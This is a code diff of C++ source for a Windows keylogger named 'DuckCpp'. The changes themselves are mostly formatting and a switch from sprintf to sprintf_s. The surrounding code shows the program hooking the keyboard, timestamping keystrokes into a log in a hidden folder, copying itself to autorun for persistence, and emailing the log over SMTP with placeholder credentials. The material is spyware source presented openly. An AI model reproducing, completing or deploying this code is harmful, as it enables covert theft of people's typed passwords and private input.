@@ -1,4 +1,3 @@
-#define _CRT_SECURE_NO_WARNINGS
 #define WIN32_LEAN_AND_MEAN
 
 #include <string>
@@ -13,7 +12,7 @@
 
 typedef std::basic_string<TCHAR, std::char_traits<TCHAR>, std::allocator<TCHAR> > tstring;
 using std::string;
-enum workMode{
+enum workMode {
 	sendLogEmail,
 	writeLogFile
 };
@@ -26,10 +25,10 @@ bool	copyToAutorun = true;
 int		timerPeriodSeconds = 3;
 
 //Mail settings
-string login      = "sender@example.com";
-string password   = "password";
-string URL        = "smtp://smtp.example.com:587";
-string repicient  = "repicient@example.com";
+string login = "sender@example.com";
+string password = "password";
+string URL = "smtp://smtp.example.com:587";
+string repicient = "repicient@example.com";
 bool trySendEmail = true;
 
 //Global variables
@@ -37,14 +36,15 @@ string keyLog;
 HANDLE logFileHandle;
 MSG msg;
 string header = "To: " + repicient + "\r\n" +
-			    "From: " + login + " (DuckCpp log sender)\r\n" +
-			    "Subject: Log\r\n\r\n";
+"From: " + login + " (DuckCpp log sender)\r\n" +
+"Subject: Log\r\n\r\n";
 workMode mode = trySendEmail ? sendLogEmail : writeLogFile;
 
 
 //Function prototypes
 LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);
 VOID CALLBACK TimerCallback(HWND, UINT, UINT idTimer, DWORD dwTime);
+static size_t readfunc(void* ptr, size_t size, size_t nmemb, void* userp);
 void processLog();
 bool sendMail();
 
@@ -57,7 +57,7 @@ int APIENTRY _tWinMain(HINSTANCE This, HINSTANCE Prev, LPTSTR cmd, int mode)
 	//Create directory for log
 	CreateDirectory(dirPath.c_str(), NULL);
 	SetFileAttributes(dirPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
-	
+
 	//Copy to autorun
 	if (copyToAutorun) {
 		TCHAR szFileName[MAX_PATH];
@@ -72,7 +72,7 @@ int APIENTRY _tWinMain(HINSTANCE This, HINSTANCE Prev, LPTSTR cmd, int mode)
 	}
 
 	//Create timer
-	SetTimer(NULL, 1, timerPeriodSeconds*1000, TimerCallback);
+	SetTimer(NULL, 1, timerPeriodSeconds * 1000, TimerCallback);
 
 	//Create or open log file
 	tstring logPath = dirPath + _T("\\") + logFileName;
@@ -107,7 +107,7 @@ LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
 		char timeBuf[10];
 		SYSTEMTIME st;
 		GetLocalTime(&st);
-		sprintf(timeBuf, "%.2u:%.2u:%.2u ", st.wHour, st.wMinute, st.wSecond);
+		sprintf_s(timeBuf, "%.2u:%.2u:%.2u ", st.wHour, st.wMinute, st.wSecond);
 		string line(timeBuf);
 
 		//Virtual key code
@@ -152,7 +152,7 @@ void processLog()
 static size_t readfunc(void* ptr, size_t size, size_t nmemb, void* userp)
 {
 	static int callNumber = 0; //Call number counter, 0 - header, 1 - body, 2 - send mail
-	
+
 	struct upload_status {
 		int lines_read;
 	} *upload_ctx = (upload_status*)userp;
@@ -196,7 +196,7 @@ bool sendMail()
 
 		if (res != CURLE_OK)
 			return false;
-		
+
 		curl_easy_cleanup(curl);
 
 		return true;
